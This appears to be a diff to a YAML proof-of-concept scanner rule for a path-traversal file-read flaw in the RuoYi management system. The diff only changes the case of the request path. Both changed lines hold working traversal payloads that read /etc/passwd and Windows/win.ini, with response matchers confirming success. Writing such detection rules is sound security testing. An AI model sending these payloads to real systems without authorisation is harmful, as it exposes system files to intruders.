@@ -2,12 +2,12 @@ name: poc-yaml-ruoyi-management-fileread
 groups:
   linux:
     - method: GET
-      path: /common/download/resource?resource=/profile/../../../../etc/passwd
+      path: /Common/download/resource?resource=/profile/../../../../etc/passwd
       expression: |
         response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
   windows:
     - method: GET
-      path: /common/download/resource?resource=/profile/../../../../Windows/win.ini
+      path: /Common/download/resource?resource=/profile/../../../../Windows/win.ini
       expression: |
         response.status == 200 && response.body.bcontains(b"for 16-bit app support")
 detail:
